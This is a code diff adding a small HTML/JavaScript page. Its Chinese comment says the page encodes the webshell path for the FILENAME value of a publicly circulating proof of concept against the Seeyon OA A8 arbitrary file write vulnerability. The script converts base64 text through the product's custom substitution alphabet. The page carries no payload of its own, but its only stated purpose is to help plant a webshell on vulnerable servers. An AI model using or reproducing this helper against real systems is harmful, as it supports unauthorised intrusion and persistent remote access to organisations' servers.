@@ -1,0 +1,49 @@
+<!----
+    主要适用于致远OA A8任意文件写入漏洞，加密webshell的路径
+    也就是网上流传的POC，FILENAME的值
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>致远OA路径加密</title>
+    <script>
+        function encode(){
+            var a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6";
+            var b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+            var c = '';
+            var d = document.getElementById('base64_result').value;   
+
+            function a2b(v) {
+                for (var i = 0; i < a.length; i++) {
+                    if (a[i] == v) {
+                        return b[i];
+                    }
+                }
+            }
+
+            function b2a(v) {
+                for (var i = 0; i < b.length; i++) {
+                    if (b[i] == v) {
+                        return a[i];
+                    }
+                }
+            }
+
+            for (var i = 0;i < d.length; i++){
+	            c = c + b2a(d[i]);
+            }
+            document.write(c)
+        }
+    </script>
+</head>
+<body>
+    请输入内容(路径名称base64加密后的):<br>
+    <textarea id="base64_result"></textarea>
+    <input type="submit" name="submit" value="加密!!!" onclick="encode()">
+
+</body>
+</html>
